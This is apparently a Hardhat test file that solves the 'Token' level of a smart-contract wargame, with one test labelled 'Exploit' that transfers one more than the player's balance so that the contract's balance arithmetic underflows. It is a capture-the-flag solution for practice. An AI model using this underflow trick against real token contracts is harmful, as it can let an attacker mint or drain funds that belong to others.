const { expect } = require("chai");
const { ethers } = require("hardhat");

const { setupLevel } = require("./utils");

describe("Token", async function () {
    let deployer;
    let player;
    let factory;
    let instance;

    before(async function () {
        [deployer, player] = await ethers.getSigners();

        level = await setupLevel("Token", player.address);
        factory = level.factory;
        instance = level.instance;
    });

    it("Exploit", async function () {
        // Overflow
        await instance.connect(player).transfer(ethers.constants.AddressZero, (await instance.connect(player).balanceOf(player.address)).add(1));
    });

    after(async function () {
        expect(await factory.callStatic.validateInstance(instance.address, player.address)).to.be.true;
    });
});